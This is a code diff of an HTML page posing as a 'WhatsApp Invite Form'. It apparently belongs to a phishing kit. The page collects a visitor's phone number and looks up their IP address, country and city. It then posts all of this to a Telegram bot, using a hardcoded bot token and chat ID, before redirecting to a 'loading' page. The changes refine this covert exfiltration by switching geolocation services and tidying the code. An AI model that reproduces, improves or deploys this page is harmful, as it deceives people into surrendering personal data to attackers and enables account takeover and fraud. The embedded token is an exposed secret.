@@ -4,111 +4,25 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>WhatsApp Invite Form</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.min.css"/>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-    }
-
-    .navbar {
-      background-color: #4CAF50;
-      padding: 15px 20px;
-      color: white;
-      font-size: 18px;
-      text-align: center;
-    }
-
-    .container {
-      max-width: 400px;
-      margin: 60px auto;
-      background-color: #fff;
-      padding: 30px 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    .logo {
-      width: 80px;
-      height: 80px;
-      object-fit: contain;
-      margin-bottom: 10px;
-    }
-
-    .sub-image {
-      width: 100%;
-      max-height: 200px;
-      object-fit: cover;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-
-    h2 {
-      color: #333;
-      margin-bottom: 20px;
-    }
-
-    .phone-input {
-      display: flex;
-      align-items: center;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-      margin-bottom: 20px;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    button {
-      background: linear-gradient(to right, #43e97b, #38f9d7);
-      color: #fff;
-      padding: 15px 25px;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 20px;
-      transition: background 0.3s ease;
-    }
-
-    button:hover {
-      background: linear-gradient(to right, #38f9d7, #43e97b);
-    }
-
-    footer {
-      background-color: #2e7d32;
-      color: white;
-      padding: 40px 20px;
-      text-align: center;
-    }
-
-    footer .footer-links {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    footer .footer-links p {
-      margin: 5px 10px;
-    }
-
-    footer .footer-bottom {
-      font-size: 14px;
-      opacity: 0.8;
-    }
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #f5f5f5; }
+    .navbar { background-color: #4CAF50; padding: 15px 20px; color: white; font-size: 18px; text-align: center; }
+    .container { max-width: 400px; margin: 60px auto; background-color: #fff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); text-align: center; }
+    .logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 10px; }
+    .sub-image { width: 100%; max-height: 200px; object-fit: cover; border-radius: 8px; margin-bottom: 20px; }
+    h2 { color: #333; margin-bottom: 20px; }
+    .phone-input { display: flex; align-items: center; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; margin-bottom: 20px; width: 100%; box-sizing: border-box; }
+    button { background: linear-gradient(to right, #43e97b, #38f9d7); color: #fff; padding: 15px 25px; font-size: 16px; font-weight: bold; border: none; border-radius: 30px; cursor: pointer; width: 100%; margin-top: 20px; transition: background 0.3s ease; }
+    button:hover { background: linear-gradient(to right, #38f9d7, #43e97b); }
+    footer { background-color: #2e7d32; color: white; padding: 40px 20px; text-align: center; }
+    footer .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 20px; }
+    footer .footer-links p { margin: 5px 10px; }
+    footer .footer-bottom { font-size: 14px; opacity: 0.8; }
   </style>
 </head>
 <body>
-  <div class="navbar">
-    🌿 WhatsApp Invite
-  </div>
+  <div class="navbar">🌿 WhatsApp Invite</div>
 
   <div class="container">
     <img src="DSxOAUB0raA.png" alt="Banner Image" class="sub-image" />
@@ -141,17 +55,18 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
   <script>
     const input = document.querySelector("#phone");
+    let userCountry = "us"; // fallback
+
+    fetch("https://ipapi.co/json")
+      .then(response => response.json())
+      .then(data => {
+        userCountry = data.country_code.toLowerCase();
+        iti.setCountry(userCountry);
+      });
+
     const iti = window.intlTelInput(input, {
       initialCountry: "auto",
-      geoIpLookup: function (callback) {
-        fetch("https://ipinfo.io/json?token=YOUR_TOKEN")
-          .then((resp) => resp.json())
-          .then((data) => {
-            const countryCode = data && data.country ? data.country : "US";
-            callback(countryCode.toLowerCase());
-          })
-          .catch(() => callback("us"));
-      },
+      geoIpLookup: callback => callback(userCountry),
       utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
     });
 
@@ -167,38 +82,40 @@
       const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
       const chatId = "7196613507";
 
-      fetch("https://ipinfo.io/json?token=YOUR_TOKEN")
-        .then((response) => response.json())
-        .then((data) => {
-          const ip = data.ip || "Unavailable";
-          const country = data.country || "Unavailable";
-          const city = data.city || "Unavailable";
+      fetch("https://ipapi.co/json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || "N/A";
+          const country = data.country_name || "N/A";
+          const city = data.city || "N/A";
 
-          const message = `New Submission:\n\ud83d\udcde Phone: ${phoneNumber}\n\ud83c\udf0d Country: ${country}\n\ud83c\udf07 City: ${city}\n\ud83d\udcbb IP: ${ip}`;
+          const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
 
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               chat_id: chatId,
               text: message
             })
           })
-          .then(response => response.json())
+          .then(res => res.json())
           .then(data => {
             if (!data.ok) {
-              console.error("Telegram API error:", data);
-              alert(`Telegram API error: ${data.description}`);
+              alert("Telegram Error: " + data.description);
+              console.error("Telegram Error:", data);
             } else {
               window.location.href = "loading.html";
             }
           })
           .catch(err => {
+            alert("Something went wrong. Try again.");
             console.error("Fetch error:", err);
-            alert("An error occurred. Please try again.");
           });
+        })
+        .catch(err => {
+          alert("Unable to fetch your location. Try again.");
+          console.error("IPAPI error:", err);
         });
     });
   </script>
